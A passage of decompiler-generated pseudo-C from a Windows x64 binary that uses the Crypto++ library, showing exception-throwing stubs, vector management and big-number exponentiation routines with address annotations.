  char Src; // [rsp+70h] [rbp-38h]

  v0 = sub_14004FF80(&Src);
  std::exception::exception((std::exception *)&v1);
  v1 = &off_1400A8798;
  v2 = 0;
  v5 = 15i64;
  v4 = 0i64;
  Dst = 0;
  sub_140004DF0(&Dst, v0, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v1 = &off_1400A8798;
  CxxThrowException(&v1, &_TI3_AVcls_004_CryptoPP__);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B70: using guessed type int _TI3_AVcls_004_CryptoPP__;

//----- (0000000140051DD0) ----------------------------------------------------
void __noreturn sub_140051DD0()
{
  void **v0; // rbx
  __int64 (__fastcall **v1)(void *); // [rsp+30h] [rbp-78h]
  int v2; // [rsp+48h] [rbp-60h]
  char Dst; // [rsp+50h] [rbp-58h]
  __int64 v4; // [rsp+60h] [rbp-48h]
  __int64 v5; // [rsp+68h] [rbp-40h]
  char Src; // [rsp+70h] [rbp-38h]

  v0 = sub_14004FF80(&Src);
  std::exception::exception((std::exception *)&v1);
  v1 = &off_1400A8798;
  v2 = 0;
  v5 = 15i64;
  v4 = 0i64;
  Dst = 0;
  sub_140004DF0(&Dst, v0, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v1 = &off_1400A8798;
  CxxThrowException(&v1, &_TI3_AVcls_004_CryptoPP__);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B70: using guessed type int _TI3_AVcls_004_CryptoPP__;

//----- (0000000140051E70) ----------------------------------------------------
void __fastcall sub_140051E70(__int64 a1)
{
  __int64 v1; // rbx
  unsigned int v2; // eax

  v1 = a1;
  v2 = (*(__int64 (__fastcall **)(signed __int64))(*(_QWORD *)(*(_QWORD *)(a1 + 16) + 8i64) + 32i64))(*(_QWORD *)(a1 + 16) + 8i64);
  sub_140051210(v1 + 24, v2);
  sub_140038C40(v1 + 48, *(unsigned int *)(v1 + 32));
  sub_140051210(v1 + 72, *(unsigned int *)(v1 + 32));
}

//----- (0000000140051EB0) ----------------------------------------------------
__int64 __fastcall sub_140051EB0(__int64 a1)
{
  return (*(__int64 (__fastcall **)(__int64, _QWORD, _QWORD))(*(_QWORD *)a1 + 112i64))(a1, 0i64, 0i64);
}

//----- (0000000140051EC0) ----------------------------------------------------
__int64 __fastcall sub_140051EC0(_QWORD *a1, __int64 a2, int a3)
{
  int v3; // edi
  __int64 v4; // rbp
  _QWORD *v5; // r14
  _QWORD *v6; // rax
  __int64 v7; // rbx
  _QWORD *v8; // rsi
  unsigned __int64 v9; // rax
  __int64 result; // rax

  v3 = a3;
  v4 = a2;
  v5 = a1;
  v6 = (_QWORD *)(*(__int64 (**)(void))(*a1 + 144i64))();
  v7 = *v6;
  v8 = v6;
  v9 = sub_1400395E0(v5, v3);
  (*(void (__fastcall **)(_QWORD *, __int64, unsigned __int64))(v7 + 64))(v8, v4, v9);
  result = (*(unsigned int (__fastcall **)(_QWORD *))(*v8 + 16i64))(v8);
  v5[11] = (unsigned int)result;
  return result;
}

//----- (0000000140051F40) ----------------------------------------------------
errno_t __fastcall sub_140051F40(_QWORD *a1, const void *a2, int a3)
{
  rsize_t v3; // rbx
  void *v4; // rdi
  const void *v5; // rsi
  unsigned __int64 v6; // rax

  v3 = a1[4];
  v4 = (void *)a1[5];
  v5 = a2;
  v6 = sub_1400395E0(a1, a3);
  return memcpy_s(v4, v3, v5, v6);
}

//----- (0000000140051F90) ----------------------------------------------------
void __noreturn sub_140051F90()
{
  char v0; // [rsp+28h] [rbp-80h]
  __int64 v1; // [rsp+38h] [rbp-70h]
  __int64 v2; // [rsp+40h] [rbp-68h]
  __int64 (__fastcall **v3)(void *); // [rsp+50h] [rbp-58h]
  int v4; // [rsp+68h] [rbp-40h]
  char Dst; // [rsp+70h] [rbp-38h]
  __int64 v6; // [rsp+80h] [rbp-28h]
  __int64 v7; // [rsp+88h] [rbp-20h]

  v2 = 15i64;
  v1 = 0i64;
  v0 = 0;
  sub_140004F20(&v0, byte_1400A3400, 0i64);
  std::exception::exception((std::exception *)&v3);
  v3 = &off_1400A8798;
  v4 = 0;
  v7 = 15i64;
  v6 = 0i64;
  Dst = 0;
  sub_140004DF0(&Dst, &v0, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v3 = &off_1400A8798;
  CxxThrowException(&v3, &_TI3_AVcls_004_CryptoPP__);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B70: using guessed type int _TI3_AVcls_004_CryptoPP__;

//----- (0000000140052050) ----------------------------------------------------
__int64 __fastcall sub_140052050(__int64 a1)
{
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 - 16) + 24i64))(a1 - 16);
}

//----- (0000000140052060) ----------------------------------------------------
void __fastcall sub_140052060(_QWORD *a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rsi
  _QWORD *v4; // rdi
  unsigned int v5; // ebx
  __int64 v6; // rcx
  __int64 v7; // rcx
  __int64 (__fastcall **v8)(void *); // [rsp+30h] [rbp-88h]
  __int64 (__fastcall **v9)(); // [rsp+38h] [rbp-80h]

  v3 = a2;
  v4 = a1;
  sub_14005F7E0((__int64)&v8, a3, 48);
  v8 = &off_1400A9C28;
  v9 = &off_1400ACF98;
  sub_14004C9F0(&v8, 1, 2);
  (*(void (__fastcall **)(_QWORD *, __int64 (__fastcall ***)(void *)))(v4[7] + 16i64))(v4 + 7, &v8);
  v5 = 0;
  v6 = v4[13] - v4[12];
  if ( ((unsigned __int64)((unsigned __int128)(v6 * (signed __int128)7378697629483820647i64) >> 64) >> 63)
     + ((signed __int64)((unsigned __int128)(v6 * (signed __int128)7378697629483820647i64) >> 64) >> 4) )
  {
    v7 = 0i64;
    do
    {
      (*(void (__fastcall **)(__int64, __int64 (__fastcall ***)(void *), __int64))(*(_QWORD *)v3 + 40i64))(
        v3,
        &v8,
        v4[12] + 40 * v7);
      v7 = ++v5;
    }
    while ( v5 < ((unsigned __int64)((unsigned __int128)((signed __int64)(v4[13] - v4[12])
                                                       * (signed __int128)7378697629483820647i64) >> 64) >> 63)
               + ((signed __int64)((unsigned __int128)((signed __int64)(v4[13] - v4[12])
                                                     * (signed __int128)7378697629483820647i64) >> 64) >> 4) );
  }
  sub_1400609E0((__int64)&v8);
  sub_14005F8B0((__int64)&v8);
}
// 1400A9C28: using guessed type __int64 (__fastcall *off_1400A9C28)(void *);
// 1400ACF98: using guessed type __int64 (__fastcall *off_1400ACF98)();

//----- (0000000140052190) ----------------------------------------------------
void __noreturn sub_140052190()
{
  char v0; // [rsp+28h] [rbp-80h]
  __int64 v1; // [rsp+38h] [rbp-70h]
  __int64 v2; // [rsp+40h] [rbp-68h]
  __int64 (__fastcall **v3)(void *); // [rsp+50h] [rbp-58h]
  int v4; // [rsp+68h] [rbp-40h]
  char Dst; // [rsp+70h] [rbp-38h]
  __int64 v6; // [rsp+80h] [rbp-28h]
  __int64 v7; // [rsp+88h] [rbp-20h]

  v2 = 15i64;
  v1 = 0i64;
  v0 = 0;
  sub_140004F20(&v0, byte_1400A3400, 0i64);
  std::exception::exception((std::exception *)&v3);
  v3 = &off_1400A8798;
  v4 = 0;
  v7 = 15i64;
  v6 = 0i64;
  Dst = 0;
  sub_140004DF0(&Dst, &v0, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v3 = &off_1400A8798;
  CxxThrowException(&v3, &_TI3_AVcls_004_CryptoPP__);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B70: using guessed type int _TI3_AVcls_004_CryptoPP__;

//----- (0000000140052250) ----------------------------------------------------
void *__fastcall sub_140052250(__int64 a1, void *a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rdi
  __int64 v5; // rsi
  void *v6; // rbp
  __int64 v7; // rbx
  signed int v8; // ST20_4

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  sub_14003C210(a2);
  v8 = 1;
  (*(void (__fastcall **)(__int64, void *, __int64, __int64, signed int))(*(_QWORD *)v7 + 96i64))(v7, v6, v5, v4, v8);
  return v6;
}

//----- (00000001400522D0) ----------------------------------------------------
void __noreturn sub_1400522D0()
{
  char v0; // [rsp+28h] [rbp-80h]
  __int64 v1; // [rsp+38h] [rbp-70h]
  __int64 v2; // [rsp+40h] [rbp-68h]
  __int64 (__fastcall **v3)(void *); // [rsp+50h] [rbp-58h]
  int v4; // [rsp+68h] [rbp-40h]
  char Dst; // [rsp+70h] [rbp-38h]
  __int64 v6; // [rsp+80h] [rbp-28h]
  __int64 v7; // [rsp+88h] [rbp-20h]

  v2 = 15i64;
  v1 = 0i64;
  v0 = 0;
  sub_140004F20(&v0, byte_1400A3400, 0i64);
  std::exception::exception((std::exception *)&v3);
  v3 = &off_1400A8798;
  v4 = 0;
  v7 = 15i64;
  v6 = 0i64;
  Dst = 0;
  sub_140004DF0(&Dst, &v0, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v3 = &off_1400A8798;
  CxxThrowException(&v3, &_TI3_AVcls_004_CryptoPP__);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B70: using guessed type int _TI3_AVcls_004_CryptoPP__;

//----- (0000000140052390) ----------------------------------------------------
__int64 __fastcall sub_140052390(__int64 a1)
{
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 + 48) + 104i64))(a1 + 48);
}

//----- (00000001400523A0) ----------------------------------------------------
__int64 __fastcall sub_1400523A0(__int64 a1, unsigned __int8 (__fastcall ***a2)(_QWORD), __int64 a3)
{
  __int64 v3; // r14
  unsigned __int8 (__fastcall ***v4)(_QWORD); // rsi
  __int64 v5; // r15
  __int64 v6; // rax
  char v7; // bl
  void *v8; // rdx
  void *v9; // rdx
  __int64 result; // rax
  char v11; // [rsp+28h] [rbp-70h]
  __int64 v12; // [rsp+38h] [rbp-60h]
  void *Memory; // [rsp+40h] [rbp-58h]
  char v14; // [rsp+50h] [rbp-48h]
  __int64 v15; // [rsp+60h] [rbp-38h]
  void *v16; // [rsp+68h] [rbp-30h]

  v3 = a3;
  v4 = a2;
  v5 = a1;
  if ( (**a2)(a2) )
  {
    v6 = ((__int64 (__fastcall *)(unsigned __int8 (__fastcall ***)(_QWORD), char *, __int64))(*v4)[1])(v4, &v14, v3);
    v7 = 1;
  }
  else
  {
    v6 = sub_14003C000((__int64)&v11, v3);
    v7 = 2;
  }
  sub_14003C670(v5 + 8, v6);
  if ( v7 & 2 )
  {
    v7 &= 0xFDu;
    v8 = Memory;
    memset(Memory, 0, 8 * v12);
    free(v8);
  }
  if ( v7 & 1 )
  {
    v9 = v16;
    memset(v16, 0, 8 * v15);
    free(v9);
  }
  if ( *(_QWORD *)(v5 + 96) == *(_QWORD *)(v5 + 104) || (unsigned int)sub_140045A60(v5 + 8, *(_QWORD *)(v5 + 96)) )
  {
    sub_140053AA0((__int64 *)(v5 + 96), 1ui64);
    sub_14003C670(*(_QWORD *)(v5 + 96), v5 + 8);
  }
  result = (**v4)(v4);
  if ( (_BYTE)result )
    result = sub_14003C670(v5 + 8, v3);
  return result;
}

//----- (00000001400524E0) ----------------------------------------------------
void __fastcall sub_1400524E0(__int64 a1, int a2)
{
  _QWORD *v2; // rbx
  __int64 (__fastcall **v3)(void *); // [rsp+30h] [rbp-78h]
  int v4; // [rsp+48h] [rbp-60h]
  char Dst; // [rsp+50h] [rbp-58h]
  __int64 v6; // [rsp+60h] [rbp-48h]
  __int64 v7; // [rsp+68h] [rbp-40h]
  char Src; // [rsp+70h] [rbp-38h]

  if ( a2 && a2 != *(_DWORD *)(a1 + 32) )
  {
    v2 = sub_14004FAA0(&Src);
    std::exception::exception((std::exception *)&v3);
    v3 = &off_1400A8798;
    v4 = 1;
    v7 = 15i64;
    v6 = 0i64;
    Dst = 0;
    sub_140004DF0(&Dst, v2, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    v3 = &off_1400A8798;
    CxxThrowException(&v3, &_TI3_AVcls_001_CryptoPP__);
  }
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B30: using guessed type int _TI3_AVcls_001_CryptoPP__;

//----- (00000001400525A0) ----------------------------------------------------
void __fastcall sub_1400525A0(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rbx
  __int64 v5; // rdi
  __int64 v6; // rsi
  __int64 *v7; // rax

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = (__int64 *)(*(__int64 (**)(void))(*(_QWORD *)a1 + 176i64))();
  sub_1400525F0(v7, v6, v5, v4);
}

//----- (00000001400525F0) ----------------------------------------------------
void __fastcall sub_1400525F0(__int64 *a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // r13
  __int64 *v5; // rbx
  unsigned __int64 v6; // r12
  __int64 v7; // r15
  __int64 v8; // r14
  unsigned __int64 v9; // rsi
  char v10; // di
  __int64 v11; // rax
  unsigned int v12; // eax
  unsigned int v13; // eax
  unsigned __int64 v14; // rdx
  unsigned __int64 v15; // rdi
  unsigned __int64 v16; // rdx
  unsigned __int64 v17; // r8
  unsigned __int64 v18; // rdx
  unsigned __int64 v19; // rdx
  __int64 v20; // rdi
  unsigned __int64 v21; // rdx
  unsigned __int64 v22; // rdi
  unsigned __int64 v23; // rdx
  unsigned __int64 v24; // rdx
  void *v25; // rdx
  void *v26; // rdx
  __int64 *v27; // rdi
  unsigned __int64 v28; // rax
  int v29; // edi
  char v30; // r12
  __int64 v31; // r15
  unsigned int v32; // eax
  bool v33; // zf
  _QWORD *v34; // r13
  unsigned int *v35; // rsi
  void *v36; // r14
  __int64 v37; // rdi
  __int64 v38; // rax
  __int64 v39; // rax
  void **v40; // r14
  _QWORD *v41; // r15
  __int64 v42; // r12
  unsigned __int64 v43; // rdx
  signed int v44; // edx
  signed __int64 v45; // rsi
  signed __int64 v46; // r12
  __int64 v47; // r13
  __int64 v48; // rdi
  __int64 v49; // rsi
  __int64 v50; // rax
  __int64 v51; // rax
  void *v52; // rdx
  void *v53; // rbx
  void **v54; // rsi
  void *v55; // rdx
  void *v56; // rdx
  void *v57; // r15
  _QWORD *v58; // rbx
  __int64 v59; // r14
  void (__fastcall ***v60)(void *, _QWORD); // rdi
  void (__fastcall ***i)(void *, _QWORD); // rsi
  unsigned int v62; // [rsp+20h] [rbp-A8h]
  int v63; // [rsp+20h] [rbp-A8h]
  __int64 v64; // [rsp+28h] [rbp-A0h]
  unsigned __int64 v65; // [rsp+28h] [rbp-A0h]
  __int64 v66; // [rsp+28h] [rbp-A0h]
  void **v67; // [rsp+30h] [rbp-98h]
  void *v68[2]; // [rsp+38h] [rbp-90h]
  __int64 v69; // [rsp+48h] [rbp-80h]
  __int64 v70; // [rsp+50h] [rbp-78h]
  __int64 v71; // [rsp+58h] [rbp-70h]
  void *Memory; // [rsp+60h] [rbp-68h]
  __int64 v73; // [rsp+68h] [rbp-60h]
  void *v74; // [rsp+70h] [rbp-58h]
  int v75; // [rsp+78h] [rbp-50h]
  char v76; // [rsp+7Ch] [rbp-4Ch]
  __int16 v77; // [rsp+7Dh] [rbp-4Bh]
  char v78; // [rsp+7Fh] [rbp-49h]
  void *v79; // [rsp+80h] [rbp-48h]
  void *v80; // [rsp+88h] [rbp-40h]
  __int64 v81; // [rsp+98h] [rbp-30h]
  char v82; // [rsp+A0h] [rbp-28h]
  __int64 v83; // [rsp+B0h] [rbp-18h]
  void *v84; // [rsp+B8h] [rbp-10h]
  __int64 v85; // [rsp+C8h] [rbp+0h]
  __int64 v86; // [rsp+120h] [rbp+58h]
  __int64 v87; // [rsp+128h] [rbp+60h]
  unsigned int v88; // [rsp+138h] [rbp+70h]

  v85 = -2i64;
  v4 = a4;
  v5 = a1;
  v6 = v88;
  v70 = v88;
  sub_14004DDB0(&v84, v88);
  _mm_storeu_si128((__m128i *)v68, (__m128i)0i64);
  v7 = 0i64;
  v69 = 0i64;
  if ( (_DWORD)v6 )
  {
    if ( v6 > 0x2AAAAAAAAAAAAAAi64 )
    {
      std::_Xlength_error("vector<T> too long");
      __debugbreak();
    }
    sub_140053420((__int64 *)v68, v6);
    v7 = v69;
  }
  v62 = 0;
  v8 = (__int64)v68[1];
  if ( !(_DWORD)v6 )
    goto LABEL_48;
  v64 = 0i64;
  v9 = (unsigned __int64)v68[0];
  while ( 1 )
  {
    v10 = (*(__int64 (__fastcall **)(__int64 *))(*v5 + 40))(v5);
    sub_14003C000((__int64)&v71, v4);
    v11 = sub_140049E30();
    sub_14003C000((__int64)&v69, v11);
    v74 = 0i64;
    v75 = 0;
    v76 = v10;
    v77 = 256;
    v78 = 0;
    v12 = sub_140045340((__int64)&v71);
    if ( v12 > 0x11 )
    {
      if ( v12 > 0x18 )
      {
        if ( v12 > 0x46 )
        {
          if ( v12 > 0xC5 )
            v13 = v12 > 0x21B ? (v12 > 0x59A) + 6 : 5;
          else
            v13 = 4;
        }
        else
        {
          v13 = 3;
        }
      }
      else
      {
        v13 = 2;
      }
    }
    else
    {
      v13 = 1;
    }
    LODWORD(v74) = v13;
    sub_14003D760((__int64)&v69, v13);
    if ( (unsigned __int64)&v71 < v8 && v9 <= (unsigned __int64)&v71 )
      break;
    if ( v8 == v7
      && ((unsigned __int64)((unsigned __int128)((v7 - v8) * (signed __int128)3074457345618258603i64) >> 64) >> 63)
       + ((signed __int64)((unsigned __int128)((v7 - v8) * (signed __int128)3074457345618258603i64) >> 64) >> 4) < 1 )
    {
      v8 -= v9;
      v21 = ((unsigned __int64)((unsigned __int128)(v8 * (signed __int128)3074457345618258603i64) >> 64) >> 63)
          + ((signed __int64)((unsigned __int128)(v8 * (signed __int128)3074457345618258603i64) >> 64) >> 4);
      if ( 192153584101141162i64 - v21 < 1 )
        goto LABEL_47;
      v22 = v21 + 1;
      v23 = ((unsigned __int64)((unsigned __int128)((signed __int64)(v7 - v9) * (signed __int128)3074457345618258603i64) >> 64) >> 63)
          + ((signed __int64)((unsigned __int128)((signed __int64)(v7 - v9) * (signed __int128)3074457345618258603i64) >> 64) >> 4);
      if ( 192153584101141162i64 - (v23 >> 1) >= v23 )
        v24 = (v23 >> 1) + v23;
      else
        v24 = 0i64;
      if ( v24 < v22 )
        v24 = v22;
      sub_140053420((__int64 *)v68, v24);
      v7 = v69;
      v8 = (__int64)v68[1];
    }
    v81 = v8;
    if ( v8 )
    {
      sub_14003C000(v8, (__int64)&v71);
      sub_14003C000(v8 + 40, (__int64)&v69);
      *(_QWORD *)(v8 + 80) = v74;
      *(_DWORD *)(v8 + 88) = v75;
      *(_BYTE *)(v8 + 92) = v76;
      *(_WORD *)(v8 + 93) = v77;
      *(_BYTE *)(v8 + 95) = v78;
    }
    v9 = (unsigned __int64)v68[0];
LABEL_44:
    v8 += 96i64;
    v68[1] = (void *)v8;
    v67 = (void **)v8;
    v4 += 40i64;
    v25 = Memory;
    memset(Memory, 0, 8 * v71);
    free(v25);
    v26 = v74;
    memset(v74, 0, 8 * v73);
    free(v26);
    sub_14004F830(v9 + 96i64 * v62);
    v27 = (__int64 *)((char *)v79 + 24 * v62);
    v28 = (*(__int64 (__fastcall **)(__int64 *))(*v5 + 16))(v5);
    sub_140053B90(v27, 1 << (*(unsigned int *)(v64 + v9 + 80) - 1), v28);
    ++v62;
    v64 += 96i64;
    if ( v62 >= (unsigned int)v6 )
      goto LABEL_49;
  }
  v14 = (unsigned __int128)((signed __int64)((signed __int64)&v71 - v9) * (signed __int128)3074457345618258603i64) >> 64;
  v15 = (v14 >> 63) + ((signed __int64)v14 >> 4);
  if ( v8 != v7
    || ((unsigned __int64)((unsigned __int128)((v7 - v8) * (signed __int128)3074457345618258603i64) >> 64) >> 63)
     + ((signed __int64)((unsigned __int128)((v7 - v8) * (signed __int128)3074457345618258603i64) >> 64) >> 4) >= 1 )
  {
LABEL_29:
    v20 = v9 + 96 * v15;
    v81 = v8;
    if ( v8 )
    {
      sub_14003C000(v8, v20);
      sub_14003C000(v8 + 40, v20 + 40);
      *(_DWORD *)(v8 + 80) = *(_DWORD *)(v20 + 80);
      *(_DWORD *)(v8 + 84) = *(_DWORD *)(v20 + 84);
      *(_DWORD *)(v8 + 88) = *(_DWORD *)(v20 + 88);
      *(_BYTE *)(v8 + 92) = *(_BYTE *)(v20 + 92);
      *(_BYTE *)(v8 + 93) = *(_BYTE *)(v20 + 93);
      *(_BYTE *)(v8 + 94) = *(_BYTE *)(v20 + 94);
      *(_BYTE *)(v8 + 95) = *(_BYTE *)(v20 + 95);
    }
    goto LABEL_44;
  }
  v8 -= v9;
  v16 = ((unsigned __int64)((unsigned __int128)(v8 * (signed __int128)3074457345618258603i64) >> 64) >> 63)
      + ((signed __int64)((unsigned __int128)(v8 * (signed __int128)3074457345618258603i64) >> 64) >> 4);
  if ( 192153584101141162i64 - v16 >= 1 )
  {
    v17 = v16 + 1;
    v18 = ((unsigned __int64)((unsigned __int128)((signed __int64)(v7 - v9) * (signed __int128)3074457345618258603i64) >> 64) >> 63)
        + ((signed __int64)((unsigned __int128)((signed __int64)(v7 - v9) * (signed __int128)3074457345618258603i64) >> 64) >> 4);
    if ( 192153584101141162i64 - (v18 >> 1) >= v18 )
      v19 = (v18 >> 1) + v18;
    else
      v19 = 0i64;
    if ( v19 < v17 )
      v19 = v17;
    sub_140053420((__int64 *)v68, v19);
    v7 = v69;
    v8 = (__int64)v68[1];
    v9 = (unsigned __int64)v68[0];
    goto LABEL_29;
  }
  std::_Xlength_error("vector<T> too long");
  __debugbreak();
LABEL_47:
  std::_Xlength_error("vector<T> too long");
LABEL_48:
  v67 = (void **)v8;
  v9 = (unsigned __int64)v68[0];
LABEL_49:
  v29 = 0;
  v63 = 0;
  sub_14003C000((__int64)&v82, v87);
  while ( 1 )
  {
    v30 = 0;
    v31 = 0i64;
    v32 = v88;
    v33 = v88 == 0;
    if ( !v88 )
      break;
    v34 = v79;
    v35 = (unsigned int *)(v9 + 88);
    v36 = v68[0];
    do
    {
      if ( !*((_BYTE *)v35 + 7) && v29 == *(v35 - 1) )
      {
        v65 = *v34 + 40 * ((unsigned __int64)*v35 >> 1);
        if ( *((_BYTE *)v35 + 5) )
        {
          v37 = *v5;
          v38 = (*(__int64 (__fastcall **)(__int64 *, char *))(*v5 + 32))(v5, &v82);
          (*(void (__fastcall **)(__int64 *, unsigned __int64, __int64))(v37 + 64))(v5, v65, v38);
          v29 = v63;
        }
        else
        {
          (*(void (__fastcall **)(__int64 *, unsigned __int64, char *))(*v5 + 64))(
            v5,
            *v34 + 40 * ((unsigned __int64)*v35 >> 1),
            &v82);
        }
        sub_14004F830((__int64)v36 + 96 * v31);
        v32 = v88;
      }
      if ( v30 || !*((_BYTE *)v35 + 7) )
        v30 = 1;
      v31 = (unsigned int)(v31 + 1);
      v34 += 3;
      v35 += 24;
    }
    while ( (unsigned int)v31 < v32 );
    if ( !v30 )
    {
      v33 = v32 == 0;
      break;
    }
    v39 = (*(__int64 (__fastcall **)(__int64 *, char *))(*v5 + 48))(v5, &v82);
    sub_14003C670((__int64)&v82, v39);
    v63 = ++v29;
    v9 = (unsigned __int64)v68[0];
  }
  v40 = v67;
  if ( !v33 )
  {
    v41 = v79;
    do
    {
      v42 = v86;
      v66 = v86;
      v86 += 40i64;
      sub_14003C670(
        v66,
        *v41
      + 40
      * (((unsigned __int64)((unsigned __int128)((signed __int64)(v41[1] - *v41)
                                               * (signed __int128)7378697629483820647i64) >> 64) >> 63)
       - 1
       + ((signed __int64)((unsigned __int128)((signed __int64)(v41[1] - *v41) * (signed __int128)7378697629483820647i64) >> 64) >> 4)));
      v43 = ((unsigned __int64)((unsigned __int128)((signed __int64)(v41[1] - *v41)
                                                  * (signed __int128)7378697629483820647i64) >> 64) >> 63)
          + ((signed __int64)((unsigned __int128)((signed __int64)(v41[1] - *v41)
                                                * (signed __int128)7378697629483820647i64) >> 64) >> 4);
      if ( v43 > 1 )
      {
        v44 = v43 - 2;
        if ( v44 >= 1 )
        {
          v45 = 40i64 * v44;
          v46 = 40i64 * (v44 + 1);
          v47 = (unsigned int)v44;
          do
          {
            (*(void (__fastcall **)(__int64 *, signed __int64, signed __int64))(*v5 + 64))(v5, *v41 + v45, *v41 + v46);
            (*(void (__fastcall **)(__int64 *, __int64, signed __int64))(*v5 + 64))(v5, v66, v45 + *v41);
            v46 -= 40i64;
            v45 -= 40i64;
            --v47;
          }
          while ( v47 );
          v42 = v66;
        }
        (*(void (__fastcall **)(__int64 *, _QWORD, signed __int64))(*v5 + 64))(v5, *v41, *v41 + 40i64);
        v48 = *v41;
        v49 = *v5;
        v50 = (*(__int64 (__fastcall **)(__int64 *, __int64))(*v5 + 48))(v5, v42);
        v51 = (*(__int64 (__fastcall **)(__int64 *, __int64, __int64))(v49 + 24))(v5, v50, v48);
        sub_14003C670(v42, v51);
      }
      v41 += 3;
      --v70;
    }
    while ( v70 );
    v40 = v67;
  }
  v52 = v84;
  memset(v84, 0, 8 * v83);
  free(v52);
  v53 = v68[0];
  if ( v68[0] )
  {
    if ( v68[0] != v40 )
    {
      v54 = (void **)((char *)v68[0] + 64);
      do
      {
        v55 = *v54;
        memset(*v54, 0, 8i64 * (_QWORD)*(v54 - 1));
        free(v55);
        v56 = *(v54 - 5);
        memset(*(v54 - 5), 0, 8i64 * (_QWORD)*(v54 - 6));
        free(v56);
        v54 += 12;
      }
      while ( v54 - 8 != v40 );
    }
    operator delete(v53);
  }
  v57 = v79;
  if ( v79 )
  {
    v58 = v79;
    v59 = (__int64)v80;
    if ( v79 != v80 )
    {
      do
      {
        v60 = (void (__fastcall ***)(void *, _QWORD))*v58;
        if ( *v58 )
        {
          for ( i = (void (__fastcall ***)(void *, _QWORD))v58[1]; v60 != i; v60 += 5 )
            (**v60)(v60, 0i64);
          operator delete((void *)*v58);
          *v58 = 0i64;
          v58[1] = 0i64;
          v58[2] = 0i64;
        }
        v58 += 3;
      }
      while ( v58 != (_QWORD *)v59 );
    }
    operator delete(v57);
  }
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (0000000140052DD0) ----------------------------------------------------
bool __fastcall sub_140052DD0(__int64 a1)
{
  signed __int64 v1; // rbx

  v1 = a1 + 48;
  return !(*(unsigned __int8 (__fastcall **)(__int64))(*(_QWORD *)(a1 + 48) + 128i64))(a1 + 48)
      && !(*(unsigned __int8 (__fastcall **)(signed __int64))(*(_QWORD *)v1 + 192i64))(v1);
}

//----- (0000000140052E20) ----------------------------------------------------
void __noreturn sub_140052E20()
{
  char v0; // [rsp+28h] [rbp-80h]
  __int64 v1; // [rsp+38h] [rbp-70h]
  __int64 v2; // [rsp+40h] [rbp-68h]
  __int64 (__fastcall **v3)(void *); // [rsp+50h] [rbp-58h]
  int v4; // [rsp+68h] [rbp-40h]
  char Dst; // [rsp+70h] [rbp-38h]
  __int64 v6; // [rsp+80h] [rbp-28h]
  __int64 v7; // [rsp+88h] [rbp-20h]

  v2 = 15i64;
  v1 = 0i64;
  v0 = 0;
  sub_140004F20(&v0, byte_1400A3400, 0i64);
  std::exception::exception((std::exception *)&v3);
  v3 = &off_1400A8798;
  v4 = 0;
  v7 = 15i64;
  v6 = 0i64;
  Dst = 0;
  sub_140004DF0(&Dst, &v0, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v3 = &off_1400A8798;
  CxxThrowException(&v3, &_TI3_AVcls_004_CryptoPP__);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B70: using guessed type int _TI3_AVcls_004_CryptoPP__;

//----- (0000000140052EE0) ----------------------------------------------------
__int64 __fastcall sub_140052EE0(_QWORD *a1, __int64 a2, unsigned int a3, __int64 a4)
{
  __int64 v4; // rbp
  unsigned int v5; // ebx
  __int64 v6; // rdi
  _QWORD *v7; // r14
  __int64 v8; // rsi
  __int64 v9; // rax
  __int64 result; // rax
  __int64 v11; // [rsp+40h] [rbp+8h]

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  v8 = (*(__int64 (**)(void))(*a1 + 144i64))();
  (*(void (__fastcall **)(__int64, __int64, __int64, _QWORD))(*(_QWORD *)v8 + 56i64))(v8, v4, v6, v5);
  if ( (*(signed int (__fastcall **)(_QWORD *))(*v7 + 56i64))(v7) < 4 )
  {
    v9 = sub_140038790((__int64)v7, v4, (__int64)&v11);
    (*(void (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)v8 + 64i64))(v8, v9, v11);
  }
  result = (*(unsigned int (__fastcall **)(__int64))(*(_QWORD *)v8 + 16i64))(v8);
